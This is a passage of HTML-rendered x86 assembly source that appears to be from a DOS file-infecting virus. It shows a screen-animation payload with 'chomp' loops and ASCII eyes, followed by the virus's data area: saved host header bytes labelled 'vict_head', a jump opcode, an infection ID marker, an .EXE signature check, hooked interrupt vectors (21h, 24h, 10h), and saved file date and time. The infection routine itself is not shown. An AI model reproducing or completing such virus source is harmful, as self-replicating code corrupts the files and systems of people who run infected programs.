        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                 
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">chomp_1</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chomp_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7FFFh</span><span class="sc0">                    </span><span class="sc1">; delays</span><span class="sc0">

</span><span class="sc5">locloop_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">locloop_4</span><span class="sc0">              

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">chomp_3</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                 
</span><span class="sc5">chomp_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">data_2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">data_2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3FFFh</span><span class="sc0">                      </span><span class="sc1">; delays</span><span class="sc0">

</span><span class="sc5">locloop_6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">locloop_6</span><span class="sc0">              
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">chomp_5</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chomp_7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7FFFh</span><span class="sc0">                       </span><span class="sc1">; delays</span><span class="sc0">

</span><span class="sc5">locloop_8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">locloop_8</span><span class="sc0">              
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">data_1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">chomp_7</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">data_2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">                 
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c1</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c3</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c5</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                        </span><span class="sc1">; sort of a cls</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00ffh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
                           

</span><span class="sc5">eyes</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'(o)          (o)'</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">      </span><span class="sc1">; ASCII eyes</span><span class="sc0">
</span><span class="sc5">vict_head</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; 6 bytes of host    </span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">                                   
</span><span class="sc5">initials</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4443h</span><span class="sc0">   </span><span class="sc1">; I.D.                               </span><span class="sc0">
</span><span class="sc5">exe</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">5A4Dh</span><span class="sc0">   </span><span class="sc1">; ZM - ident for .EXE files</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc0">                                   

</span><span class="sc5">data_1</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">data_2</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">old_21h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_24h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_10h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">name_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">name_off</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">vir_seg</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">len_file</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">c1</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">c2</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">c3</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">c4</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">c5</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">          

</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">



</span></div></body>
</html>
